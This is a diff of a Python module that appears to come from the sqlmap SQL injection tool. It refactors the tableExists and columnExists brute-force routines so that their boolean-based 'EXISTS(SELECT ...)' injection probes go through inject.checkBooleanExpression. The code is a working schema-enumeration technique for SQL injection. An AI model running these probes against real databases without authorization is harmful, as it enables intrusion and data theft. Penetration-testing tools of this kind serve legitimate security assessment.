@@ -9,7 +9,6 @@ See the file 'doc/COPYING' for copying permission
 
 import time
 
-from lib.core.agent import agent
 from lib.core.common import clearConsoleLine
 from lib.core.common import dataToStdout
 from lib.core.common import getFileItems
@@ -21,6 +20,7 @@ from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.exception import sqlmapMissingMandatoryOptionException
+from lib.request import inject
 from lib.request.connect import Connect as Request
 
 def tableExists(tableFile):
@@ -37,9 +37,7 @@ def tableExists(tableFile):
     for table in tables:
         if conf.db and '(*)' not in conf.db:
             table = "%s.%s" % (conf.db, table)
-        query = agent.prefixQuery("%s" % safeStringFormat("AND EXISTS(SELECT %d FROM %s)", (randomInt(1), table)))
-        query = agent.suffixQuery(query)
-        result = Request.queryPage(agent.payload(newValue=query))
+        result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %d FROM %s)", (randomInt(1), table)))
 
         if result:
             clearConsoleLine(True)
@@ -88,9 +86,7 @@ def columnExists(columnFile):
     length = len(columns)
 
     for column in columns:
-        query = agent.prefixQuery("%s" % safeStringFormat("AND EXISTS(SELECT %s FROM %s)", (column, table)))
-        query = agent.suffixQuery(query)
-        result = Request.queryPage(agent.payload(newValue=query))
+        result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s)", (column, table)))
 
         if result:
             clearConsoleLine(True)
@@ -113,9 +109,7 @@ def columnExists(columnFile):
         columns = {}
 
         for column in retVal:
-            query = agent.prefixQuery("%s" % safeStringFormat("AND EXISTS(SELECT %s FROM %s WHERE %s>0)", (column, table, column)))
-            query = agent.suffixQuery(query)
-            result = Request.queryPage(agent.payload(newValue=query))
+            result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s WHERE %s>0)", (column, table, column)))
 
             if result:
                 columns[column] = 'numeric'
